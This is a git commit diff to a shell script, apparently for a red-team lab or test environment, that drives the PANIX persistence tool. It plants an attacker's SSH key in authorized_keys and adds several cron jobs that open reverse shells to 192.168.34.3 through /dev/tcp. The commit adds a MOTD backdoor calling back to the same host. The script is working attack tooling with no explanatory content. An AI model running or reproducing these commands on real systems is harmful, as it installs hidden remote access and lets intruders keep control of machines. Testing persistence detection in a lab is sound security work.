a214fb08015c7915d8d20229e933dcc11c6ac8dc
Graymos <142538040+Graymos@users.noreply.github.com>
2024-11-05 14:48:38 -0600

    Added MOTD persistence

--- totally-innocent-not-start-of-persistence.sh
+++ totally-innocent-not-start-of-persistence.sh
@@ -8,7 +8,6 @@ bash /tmp/totally-innocent/panix.sh -q --at --default --ip 192.168.34.3 --port 4
  
 # authorized_keys persistence
 bash /tmp/totally-innocent/panix.sh -q --authorized-keys --default --key "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDubTGnY3TWk4ycUJg9E+VpkjCp1hcim4XdVioWtTUOf hacker@getpwned.com" >/dev/null
-echo "test"
 
 #cron   
 bash /tmp/totally-innocent/panix.sh --cron --custom --command "/bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4447 0>&1'" --daily --name "evil_cron_job" >/dev/null
@@ -16,3 +15,7 @@ bash /tmp/totally-innocent/panix.sh --cron --custom --command "/bin/bash -c 'sh 
 bash /tmp/totally-innocent/panix.sh --cron --custom --command "* * * * * root /bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4448 0>&1'" --crond --name "evil_cron_job" >/dev/null
  
 bash /tmp/totally-innocent/panix.sh --cron --custom --command "* * * * * /bin/bash -c 'sh -i >& /dev/tcp/192.168.34.3/4449 0>&1'" --crontab >/dev/null
+
+#motd
+sudo ./panix.sh --motd --default --ip 192.168.34.3 --port 4450
+ 
